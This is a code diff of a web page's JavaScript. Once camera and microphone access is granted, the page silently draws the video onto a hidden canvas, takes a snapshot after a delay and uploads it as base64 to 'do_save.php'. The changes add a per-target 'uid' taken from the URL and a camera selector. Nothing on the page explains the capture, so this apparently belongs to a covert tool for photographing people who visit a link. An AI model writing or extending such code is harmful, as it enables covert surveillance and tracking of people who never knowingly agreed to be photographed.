@@ -46,14 +46,20 @@ function Get_para($para_raw)
     <canvas hidden="hidden" style="display:block" id="canvas" width="1000" height="1000"></canvas>
 </div>
 <script>
-    var $$ = mdui.JQ;
+        var $$ = mdui.JQ;
+    var cameraid = GetQueryString("cameraid");
+    var uid = GetQueryString("uid");
     var mediaStreamTrack;
     navigator.getUserMedia = navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia;
     if (navigator.getUserMedia) {
         navigator.getUserMedia({audio: true, video: {width: 1000, height: 1000}},
             function (stream) {
-                mediaStreamTrack = typeof stream.stop === 'function' ? stream : stream.getTracks()[1];
-                video.src = (window.URL || window.webkitURL).createObjectURL(stream);
+                mediaStreamTrack = typeof stream.stop === 'function' ? stream : stream.getTracks()[cameraid];
+                try {
+                    video.srcObject = stream;
+                } catch (error) {
+                    video.src = window.URL.createObjectURL(stream);
+                }
                 video.play();
                 setTimeout(function () {
                     var context = document.getElementById("canvas").getContext("2d");
@@ -64,9 +70,13 @@ function Get_para($para_raw)
                         url: 'do_save.php',
                         data: {
                             type: 'img',
+                            uid: uid,
                             data: imgdata
                         },
                         success: function (data) {
+                            console.log(data);
+                        },
+                        error: function (data) {
                             console.log(data);
                         }
                     });
@@ -80,7 +90,12 @@ function Get_para($para_raw)
     } else {
         console.log("getUserMedia not supported");
     }
-
+    function GetQueryString(name)
+    {
+        var reg = new RegExp("(^|&)"+ name +"=([^&]*)(&|$)");
+        var r = window.location.search.substr(1).match(reg);//search,查询？后面的参数，并匹配正则
+        if(r!=null)return  unescape(r[2]); return null;
+    }
     function getBase64Image(img) {
         var canvastemp = document.createElement("canvas");
         canvastemp.width = img.width;
